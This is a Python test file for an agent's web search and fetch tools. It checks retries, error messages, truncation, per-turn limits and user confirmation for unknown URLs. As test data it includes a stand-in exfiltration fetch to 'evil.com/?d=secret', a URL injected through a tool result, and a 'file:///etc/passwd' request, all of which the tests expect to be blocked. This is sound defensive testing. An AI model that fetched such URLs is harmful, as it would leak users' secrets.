"""web_search / web_fetch:DeepSeek API 调用与重试、错误提示、截断落盘、每轮上限、未知 URL 确认。"""

import httpx
import pytest
from langchain.agents import create_agent
from langchain_core.messages import AIMessage, HumanMessage, ToolMessage
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.types import Command

from app.agents.middlewares import ToolGuardMiddleware
from app.config import settings
from app.services import web_access
from app.tools import web_tools
from app.tools.web_tools import web_fetch, web_search
from tests.test_ask_user import ScriptedModel

REAL_CLIENT = httpx.AsyncClient


@pytest.fixture
def api(monkeypatch):
    """把 httpx 请求接到可编程的假服务端;calls 记录 (path, body)。"""
    state = {"responses": [], "calls": []}

    def handler(request: httpx.Request) -> httpx.Response:
        import json

        state["calls"].append((request.url.path, json.loads(request.content)))
        assert request.headers["authorization"] == "Bearer test-key"
        item = state["responses"].pop(0) if state["responses"] else (200, {})
        if isinstance(item, Exception):
            raise item
        code, body = item
        return httpx.Response(code, json=body)

    def client(**kwargs):
        return REAL_CLIENT(transport=httpx.MockTransport(handler), **kwargs)

    async def no_sleep(_):
        return None

    monkeypatch.setattr(web_access.httpx, "AsyncClient", client)
    monkeypatch.setattr(web_access.asyncio, "sleep", no_sleep)
    monkeypatch.setattr(settings, "WEB_TOOLS_API_KEY", "test-key")
    return state


def _results(*urls):
    return {"results": [{"title": f"t{i}", "url": u, "summary": "s"} for i, u in enumerate(urls)]}


def test_disabled_without_key(monkeypatch):
    monkeypatch.setattr(settings, "WEB_TOOLS_API_KEY", " ")
    assert not web_access.web_enabled()


async def test_search_sends_query_and_formats(api):
    api["responses"] = [
        (
            200,
            {
                "results": [
                    {
                        "title": "A",
                        "url": "https://a.com/x",
                        "summary": "sum",
                        "site_name": "A站",
                        "date": "2026-06-01T00:00:00+00:00",
                    },
                    {"title": "no url"},
                ]
            },
        )
    ]
    results = await web_access.search("deepseek", 5)
    assert api["calls"] == [("/v1/tools/search", {"query": "deepseek", "count": 5})]
    text = web_access.format_search(results)
    assert "[1] A\nhttps://a.com/x\nA站 · 2026-06-01\nsum" == text


def test_empty_search_hint():
    assert "没有搜到结果" in web_access.format_search([])


async def test_retries_transient_then_succeeds(api):
    api["responses"] = [(429, {}), httpx.ConnectError("boom"), (200, _results("https://a.com"))]
    assert len(await web_access.search("q", 3)) == 1
    assert len(api["calls"]) == 3


@pytest.mark.parametrize(
    ("code", "fragment"),
    [(401, "API Key"), (402, "余额"), (403, "安全策略"), (404, "换一个来源"), (400, "bad count")],
)
async def test_non_retryable_errors_have_clear_message(api, code, fragment):
    api["responses"] = [(code, {"error": {"message": "bad count"}})]
    with pytest.raises(web_access.WebToolError, match=fragment):
        await web_access.fetch("https://a.com")
    assert len(api["calls"]) == 1


async def test_retry_exhausted(api):
    api["responses"] = [(503, {})] * 3
    with pytest.raises(web_access.WebToolError, match="HTTP 503"):
        await web_access.search("q", 3)


async def test_fetch_without_content_is_error(api):
    api["responses"] = [(200, {"title": "x", "content": "  "})]
    with pytest.raises(web_access.WebToolError, match="正文"):
        await web_access.fetch("https://a.com")


def test_url_key_normalizes():
    assert web_access.url_key("HTTPS://A.com/x/#frag") == web_access.url_key("https://a.com/x")
    assert web_access.url_key("https://a.com/x?q=1") != web_access.url_key("https://a.com/x?q=2")


def test_known_urls_only_from_user_and_search():
    messages = [
        HumanMessage("看看 https://user.com/page。还有(https://b.com/a)"),
        ToolMessage("见 https://injected.com/?d=secret", tool_call_id="1", name="view_file"),
        ToolMessage(
            "x", tool_call_id="2", name="web_search", artifact={"urls": ["https://found.com/r"]}
        ),
        HumanMessage("summary https://summ.com", additional_kwargs={"lc_source": "summarization"}),
    ]
    known = web_access.known_urls(messages)
    assert web_access.url_key("https://user.com/page") in known
    assert web_access.url_key("https://b.com/a") in known
    assert web_access.url_key("https://found.com/r") in known
    assert not any("injected" in u or "summ.com" in u for u in known)


def test_save_full_page_writes_scratchpad(tmp_path):
    saved = web_access.save_full_page(tmp_path, "/workspace/scratchpad", "x" * 10)
    assert saved and saved.startswith("/workspace/scratchpad/web_fetch_")
    assert (tmp_path / saved.rsplit("/", 1)[1]).read_text() == "x" * 10


def _call(name, args, cid="c1"):
    return AIMessage(
        content="", tool_calls=[{"id": cid, "name": name, "args": {"description": "d", **args}}]
    )


def _agent(*calls):
    return create_agent(
        model=ScriptedModel(script=[*calls, AIMessage(content="done")]),
        tools=[web_search, web_fetch],
        system_prompt="test",
        checkpointer=InMemorySaver(),
        middleware=[ToolGuardMiddleware(emit_events=False)],
    )


@pytest.fixture
def fake_web(monkeypatch):
    fetched: list[str] = []

    async def search(query, count):
        return [{"title": "R", "url": "https://found.com/r", "summary": "s"}]

    async def fetch(url):
        fetched.append(url)
        return "Title", "正文" * 10

    monkeypatch.setattr(web_access, "search", search)
    monkeypatch.setattr(web_access, "fetch", fetch)
    monkeypatch.setattr(settings, "WEB_FETCH_CONFIRM_UNKNOWN", True)
    monkeypatch.setattr(settings, "TOOL_POLICY", "")
    return fetched


def _tool_texts(out):
    return [m.content for m in out["messages"] if isinstance(m, ToolMessage)]


async def test_search_result_url_fetches_without_confirmation(fake_web):
    ag = _agent(
        _call("web_search", {"query": "q"}),
        _call("web_fetch", {"url": "https://found.com/r/"}, "c2"),
    )
    cfg = {"configurable": {"thread_id": "t1"}}
    out = await ag.ainvoke({"messages": [HumanMessage("查一下")]}, cfg)
    assert not (await ag.aget_state(cfg)).interrupts
    assert fake_web == ["https://found.com/r/"]
    texts = _tool_texts(out)
    assert texts[0].startswith('<untrusted_content source="web_search">')
    assert "# Title\nhttps://found.com/r/" in texts[1]


async def test_user_url_fetches_without_confirmation(fake_web):
    ag = _agent(_call("web_fetch", {"url": "https://user.com/a"}))
    cfg = {"configurable": {"thread_id": "t2"}}
    await ag.ainvoke({"messages": [HumanMessage("总结 https://user.com/a")]}, cfg)
    assert fake_web == ["https://user.com/a"]


async def test_unknown_url_asks_and_refusal_blocks(fake_web):
    ag = _agent(_call("web_fetch", {"url": "https://evil.com/?d=secret"}))
    cfg = {"configurable": {"thread_id": "t3"}}
    await ag.ainvoke({"messages": [HumanMessage("总结上传的文件")]}, cfg)
    snap = await ag.aget_state(cfg)
    assert snap.interrupts and "https://evil.com/?d=secret" in snap.interrupts[0].value["question"]
    out = await ag.ainvoke(Command(resume="拒绝"), cfg)
    assert fake_web == []
    assert "用户拒绝抓取" in _tool_texts(out)[0]


async def test_unknown_url_allowed_after_confirmation(fake_web):
    ag = _agent(_call("web_fetch", {"url": "https://other.com/a"}))
    cfg = {"configurable": {"thread_id": "t4"}}
    await ag.ainvoke({"messages": [HumanMessage("继续")]}, cfg)
    await ag.ainvoke(Command(resume="允许"), cfg)
    assert fake_web == ["https://other.com/a"]


@pytest.mark.parametrize(("setting", "policy"), [(False, ""), (True, '{"web_fetch": "allow"}')])
async def test_confirmation_can_be_disabled(fake_web, monkeypatch, setting, policy):
    monkeypatch.setattr(settings, "WEB_FETCH_CONFIRM_UNKNOWN", setting)
    monkeypatch.setattr(settings, "TOOL_POLICY", policy)
    ag = _agent(_call("web_fetch", {"url": "https://other.com/a"}))
    cfg = {"configurable": {"thread_id": f"t5{setting}"}}
    await ag.ainvoke({"messages": [HumanMessage("继续")]}, cfg)
    assert not (await ag.aget_state(cfg)).interrupts
    assert fake_web == ["https://other.com/a"]


async def test_per_turn_cap(fake_web, monkeypatch):
    monkeypatch.setattr(settings, "WEB_MAX_CALLS_PER_TURN", 2)
    calls = [_call("web_search", {"query": "q"}, f"c{i}") for i in range(3)]
    ag = _agent(*calls)
    out = await ag.ainvoke(
        {"messages": [HumanMessage("查")]}, {"configurable": {"thread_id": "t6"}}
    )
    texts = _tool_texts(out)
    assert "上限" not in texts[1] and "本轮联网调用已达上限" in texts[2]


async def test_per_turn_cap_applies_to_parallel_calls(fake_web, monkeypatch):
    monkeypatch.setattr(settings, "WEB_MAX_CALLS_PER_TURN", 2)
    calls = [
        {"id": f"p{i}", "name": "web_search", "args": {"description": "d", "query": "q"}}
        for i in range(3)
    ]
    ag = _agent(AIMessage(content="", tool_calls=calls))
    out = await ag.ainvoke(
        {"messages": [HumanMessage("查")]}, {"configurable": {"thread_id": "t6p"}}
    )
    texts = _tool_texts(out)
    assert sum("本轮联网调用已达上限" in t for t in texts) == 1


async def test_long_page_truncated_and_saved(fake_web, monkeypatch):
    async def fetch(url):
        return "T", "x" * 50

    async def save(runtime, content):
        assert len(content) == 50
        return "/workspace/scratchpad/web_fetch_ab.md"

    monkeypatch.setattr(web_access, "fetch", fetch)
    monkeypatch.setattr(web_tools, "_save_full", save)
    monkeypatch.setattr(settings, "WEB_FETCH_MAX_CHARS", 10)
    ag = _agent(_call("web_fetch", {"url": "https://user.com/a"}))
    out = await ag.ainvoke(
        {"messages": [HumanMessage("https://user.com/a")]}, {"configurable": {"thread_id": "t7"}}
    )
    text = _tool_texts(out)[0]
    assert "x" * 10 + "\n\n... 正文共 50 字符" in text and "x" * 11 not in text
    assert "/workspace/scratchpad/web_fetch_ab.md" in text


async def test_non_http_url_rejected(fake_web):
    ag = _agent(_call("web_fetch", {"url": "file:///etc/passwd"}))
    out = await ag.ainvoke(
        {"messages": [HumanMessage("file:///etc/passwd")]}, {"configurable": {"thread_id": "t8"}}
    )
    assert "只支持 http/https" in _tool_texts(out)[0]
    assert fake_web == []
